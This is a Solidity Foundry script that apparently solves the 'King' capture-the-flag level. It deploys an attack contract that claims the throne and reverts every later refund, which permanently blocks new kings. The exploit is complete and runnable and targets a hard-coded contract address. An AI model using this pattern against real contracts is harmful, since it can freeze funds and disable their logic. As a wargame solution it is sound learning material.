// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackContract {
    address public owner;

    constructor() public {
        console.log("AttackContract address : ", address(this));
        owner = msg.sender;
    }

    function attack(King _king) public payable {
        address(payable(_king)).call{value: msg.value}("");
    }

    receive() external payable {
        if (msg.sender != owner) {
            revert();
        }
    }
}

contract KingSolution is Script {
    King public king = King(payable(0x72eb55a8553378a6d044C482Fd0FDAc53Bc73581));
    
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("King before: ", king._king());
        console.log("Player", vm.envAddress("MY_ADDRESS"));

        AttackContract attackContract = new AttackContract();

        attackContract.attack{value: king.prize()}(king);

        console.log("King after: ", king._king());

        vm.stopBroadcast();
    }
}